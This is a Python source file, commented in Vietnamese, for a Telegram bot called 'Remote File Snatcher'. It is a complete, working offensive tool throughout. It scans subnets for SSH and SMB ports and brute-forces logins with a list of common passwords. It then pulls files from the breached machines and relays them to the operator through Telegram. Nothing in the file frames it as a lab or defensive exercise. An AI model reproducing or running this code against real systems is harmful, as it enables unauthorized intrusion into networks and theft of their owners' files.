#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Bot Telegram: Remote File Snatcher
# Tác giả: palofsc
# Yêu cầu: pip install python-telegram-bot paramiko impacket

import asyncio
import os
import socket
import ipaddress
import tempfile
import threading
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ---------- THƯ VIỆN TÙY CHỌN ----------
try:
    import paramiko
except:
    paramiko = None

try:
    from impacket.smbconnection import SMBConnection
except:
    SMBConnection = None

# ---------- CẤU HÌNH ----------
TOKEN = "YOUR_BOT_TOKEN"  # Thay bằng token của bạn
WORDLIST = ["admin", "password", "123456", "root", "user", "test", "guest", "P@ssw0rd", "password123"]
TIMEOUT = 2
SCAN_THREADS = 50

# ---------- CÁC HÀM XỬ LÝ (TÁI SỬ DỤNG) ----------
def scan_ports(ip, ports):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            conn = s.connect_ex((ip, port))
            if conn == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    return open_ports

def scan_subnet(subnet, ports=[22, 445, 3389, 139]):
    results = []
    try:
        net = ipaddress.ip_network(subnet, strict=False)
        hosts = list(net.hosts())
        def worker(host):
            ip = str(host)
            ports_open = scan_ports(ip, ports)
            if ports_open:
                results.append((ip, ports_open))
        threads = []
        for host in hosts:
            t = threading.Thread(target=worker, args=(host,))
            t.start()
            threads.append(t)
            if len(threads) >= SCAN_THREADS:
                for t in threads:
                    t.join()
                threads = []
        for t in threads:
            t.join()
    except Exception as e:
        return str(e)
    return results

def brute_ssh(ip, username, wordlist=None):
    if paramiko is None:
        return "Thiếu paramiko"
    if wordlist is None:
        wordlist = WORDLIST
    for pwd in wordlist:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=TIMEOUT+1)
            client.close()
            return pwd
        except:
            continue
    return None

def get_file_ssh(ip, username, password, remote_path, local_path):
    if paramiko is None:
        return False
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=5)
        sftp = client.open_sftp()
        sftp.get(remote_path, local_path)
        sftp.close()
        client.close()
        return True
    except:
        return False

def brute_smb(ip, username="", wordlist=None):
    if SMBConnection is None:
        return "Thiếu impacket"
    if wordlist is None:
        wordlist = WORDLIST
    users = [username] if username else ["", "guest", "admin", "Administrator"]
    for user in users:
        for pwd in wordlist:
            try:
                conn = SMBConnection(ip, ip, timeout=TIMEOUT)
                conn.login(user, pwd)
                conn.close()
                return (user, pwd)
            except:
                pass
    return None

def get_file_smb(ip, username, password, remote_path, local_path):
    if SMBConnection is None:
        return False
    try:
        conn = SMBConnection(ip, ip, timeout=TIMEOUT)
        conn.login(username, password)
        if remote_path.startswith('\\\\'):
            parts = remote_path[2:].split('\\', 1)
            share = parts[0]
            path = parts[1].replace('\\', '/')
        else:
            parts = remote_path.split('/', 1)
            share = parts[0]
            path = parts[1] if len(parts) > 1 else ''
        with open(local_path, 'wb') as f:
            conn.getFile(share, path, f.write)
        conn.close()
        return True
    except:
        return False

# ---------- HÀM BOT ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Remote File Snatcher Bot\n\n"
        "Các lệnh:\n"
        "/scan <subnet> - Quét mạng (vd: /scan 192.168.1.0/24)\n"
        "/brutessh <ip> <username> - Brute SSH\n"
        "/getssh <ip> <username> <password> <remote_path> - Tải file SSH\n"
        "/brutesmb <ip> - Brute SMB\n"
        "/getsmb <ip> <username> <password> <share/path> - Tải file SMB\n"
        "/help - Hiển thị trợ giúp"
    )

async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Thiếu subnet. Ví dụ: /scan 192.168.1.0/24")
        return
    subnet = args[0]
    await update.message.reply_text(f"⏳ Đang quét {subnet} ... (có thể mất vài phút)")
    # Chạy trong thread riêng
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, scan_subnet, subnet)
    if isinstance(result, str):
        await update.message.reply_text(f"Lỗi: {result}")
        return
    if not result:
        await update.message.reply_text("Không tìm thấy máy nào.")
        return
    msg = "Kết quả quét:\n"
    for ip, ports in result:
        msg += f"{ip} - Mở: {ports}\n"
        if len(msg) > 4000:
            await update.message.reply_text(msg)
            msg = ""
    if msg:
        await update.message.reply_text(msg)

async def brutessh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Cú pháp: /brutessh <ip> <username>")
        return
    ip, username = args[0], args[1]
    await update.message.reply_text(f"⏳ Đang brute SSH {ip} với user {username} ...")
    loop = asyncio.get_event_loop()
    pwd = await loop.run_in_executor(None, brute_ssh, ip, username)
    if pwd:
        await update.message.reply_text(f"✅ Tìm thấy mật khẩu: `{pwd}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Không tìm thấy mật khẩu.")

async def getssh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 4:
        await update.message.reply_text("Cú pháp: /getssh <ip> <username> <password> <remote_path>")
        return
    ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
    # Tạo file tạm
    with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
        local = tmp.name
    await update.message.reply_text(f"⏳ Đang tải {remote} từ {ip} ...")
    loop = asyncio.get_event_loop()
    success = await loop.run_in_executor(None, get_file_ssh, ip, user, pwd, remote, local)
    if success:
        with open(local, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(remote))
        os.unlink(local)
    else:
        await update.message.reply_text("❌ Tải file thất bại.")
        if os.path.exists(local):
            os.unlink(local)

async def brutesmb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Cú pháp: /brutesmb <ip>")
        return
    ip = args[0]
    await update.message.reply_text(f"⏳ Đang brute SMB {ip} ...")
    loop = asyncio.get_event_loop()
    cred = await loop.run_in_executor(None, brute_smb, ip)
    if cred:
        user, pwd = cred
        await update.message.reply_text(f"✅ Tìm thấy: {user}:{pwd}")
    else:
        await update.message.reply_text("❌ Không tìm thấy.")

async def getsmb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 4:
        await update.message.reply_text("Cú pháp: /getsmb <ip> <username> <password> <share/path>")
        return
    ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
    with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
        local = tmp.name
    await update.message.reply_text(f"⏳ Đang tải {remote} từ {ip} ...")
    loop = asyncio.get_event_loop()
    success = await loop.run_in_executor(None, get_file_smb, ip, user, pwd, remote, local)
    if success:
        with open(local, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(remote))
        os.unlink(local)
    else:
        await update.message.reply_text("❌ Tải file thất bại.")
        if os.path.exists(local):
            os.unlink(local)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ---------- MAIN ----------
def main():
    if TOKEN == "YOUR_BOT_TOKEN":
        print("⚠️ Vui lòng đặt TOKEN bot vào biến TOKEN")
        return

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("scan", scan_cmd))
    app.add_handler(CommandHandler("brutessh", brutessh_cmd))
    app.add_handler(CommandHandler("getssh", getssh_cmd))
    app.add_handler(CommandHandler("brutesmb", brutesmb_cmd))
    app.add_handler(CommandHandler("getsmb", getsmb_cmd))

    print("🤖 Bot đang chạy...")
    app.run_polling()

if __name__ == "__main__":
    main()
